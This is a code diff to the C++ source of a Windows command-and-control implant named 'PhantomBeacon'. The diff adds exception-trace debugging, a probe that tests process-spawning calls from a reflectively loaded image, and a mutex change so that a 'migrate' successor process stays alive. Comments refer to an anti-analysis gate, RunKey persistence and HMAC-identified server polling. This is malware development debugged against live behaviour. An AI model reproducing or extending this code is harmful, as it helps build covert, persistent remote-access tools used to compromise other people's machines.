+             static_cast<unsigned long>(er->ExceptionFlags),
+             static_cast<unsigned long>(er->NumberParameters),
+             er->ExceptionAddress, reinterpret_cast<void*>(ctx->Rip),
+             reinterpret_cast<void*>(ctx->Rsp), reinterpret_cast<void*>(ctx->Rbp),
+             reinterpret_cast<void*>(ctx->Rax), reinterpret_cast<void*>(ctx->Rcx),
+             reinterpret_cast<void*>(ctx->Rdx), reinterpret_cast<void*>(ctx->R8),
+             reinterpret_cast<void*>(ctx->R9));
+    media_utils::xtrace(buf);
+
+    snprintf(buf, sizeof(buf), "ex:ret=%p ret2=%p info0=%p info1=%p",
+             ret, ret2,
+             er->NumberParameters > 0
+                 ? reinterpret_cast<void*>(er->ExceptionInformation[0]) : nullptr,
+             er->NumberParameters > 1
+                 ? reinterpret_cast<void*>(er->ExceptionInformation[1]) : nullptr);
+    media_utils::xtrace(buf);
+
+    for (const char* label : {"fault", "rip"}) {
+        const void* addr = label[0] == 'f'
+            ? er->ExceptionAddress : reinterpret_cast<const void*>(ctx->Rip);
+        MEMORY_BASIC_INFORMATION mbi{};
+        SIZE_T q = VirtualQuery(addr, &mbi, sizeof(mbi));
+        snprintf(buf, sizeof(buf),
+                 "ex:%s=%p vq=%llu base=%p alloc=%p state=%lx prot=%lx type=%lx",
+                 label, addr, static_cast<unsigned long long>(q),
+                 mbi.BaseAddress, mbi.AllocationBase,
+                 static_cast<unsigned long>(mbi.State),
+                 static_cast<unsigned long>(mbi.Protect),
+                 static_cast<unsigned long>(mbi.Type));
+        media_utils::xtrace(buf);
+    }
+
+    _ph_trace_image();
+    InterlockedExchange(&in_handler, 0);
+    return EXCEPTION_CONTINUE_SEARCH;
+}
+#endif
+
 extern "C" void beacon_main(int argc, char** argv) {
     // The anti-analysis gate lives further down, AFTER the transport config
     // exists, so a refusal can report WHY instead of exiting in silence.
+#if PHANTOM_SHELL_TRACE
+    AddVectoredExceptionHandler(1, _phantom_trace_veh);
+    {
+        char img[96];
+        snprintf(img, sizeof(img), "veh:installed img=%p",
+                 reinterpret_cast<void*>(&_phantom_trace_veh));
+        media_utils::xtrace(img);
+    }
+    // Optional main-thread check: the same CreateProcess call on the thread the
+    // reflective loader attached to. If this succeeds while the task worker
+    // faults, the worker/CRT path is the problem; if it also faults, the
+    // mapped image's call into kernelbase is not thread-specific.
+    {
+        char en[8]{};
+        if (GetEnvironmentVariableA("PHANTOM_SPAWN_PROBE_MAIN", en, sizeof(en)) > 0) {
+            media_utils::xtrace("probe:main:enter");
+            _ph_trace_image();
+            HMODULE k32m = GetModuleHandleA("kernel32.dll");
+            HMODULE kbm = GetModuleHandleA("kernelbase.dll");
+            void* gpaAm = k32m ? reinterpret_cast<void*>(
+                GetProcAddress(k32m, "CreateProcessA")) : nullptr;
+            void* kbAm = kbm ? reinterpret_cast<void*>(
+                GetProcAddress(kbm, "CreateProcessA")) : nullptr;
+            _ph_spawn_attempt("main-kb-a", false, false, false, kbAm);
+            _ph_spawn_attempt("main-gpa-a", false, false, false, gpaAm);
+            media_utils::xtrace("probe:main:done");
+        }
+    }
+#endif
 
 #ifdef _WIN32
     // ── Single-instance guard ────────────────────────────────────────────
@@ -1239,6 +1841,16 @@ extern "C" void beacon_main(int argc, char** argv) {
     // with the SAME HMAC identity double-poll, race tasks and break the
     // server's nonce tracking. A per-identity mutex in the user session
     // makes the duplicate exit silently within seconds.
+    //
+    // The mutex is created WITHOUT initial ownership and the process WAITS
+    // for it instead of exiting on sight: a successful `migrate` spawns the
+    // successor while this instance is still sending the result and tearing
+    // down, so the successor must be able to wait out the old owner (the
+    // kernel marks the mutex abandoned when that process dies). Live defect
+    // 2026-10-19: the successor saw ERROR_ALREADY_EXISTS, exited within
+    // milliseconds, and the original then exited too — migration left
+    // NOTHING alive. A genuine duplicate (RunKey rebirth while the senior
+    // lives) simply times out and lets the senior instance keep working.
     {
         std::string mux = std::string("Local\\PhantomBeacon-") +
 #ifdef BEACON_AUTH_ENABLED
@@ -1246,11 +1858,13 @@ extern "C" void beacon_main(int argc, char** argv) {
 #else
             "default";
 #endif
-        HANDLE hMux = CreateMutexA(nullptr, TRUE, mux.c_str());
-        if (hMux && GetLastError() == ERROR_ALREADY_EXISTS) {
-            ReleaseMutex(hMux);
-            CloseHandle(hMux);
-            return;   // duplicate birth — let the senior instance work
+        HANDLE hMux = CreateMutexA(nullptr, FALSE, mux.c_str());
+        if (hMux) {
+            DWORD wait = WaitForSingleObject(hMux, 30000);
+            if (wait != WAIT_OBJECT_0 && wait != WAIT_ABANDONED) {
+                CloseHandle(hMux);
+                return;   // duplicate birth — let the senior instance work
+            }
         }
         // hMux intentionally leaked: held for process lifetime.
     }
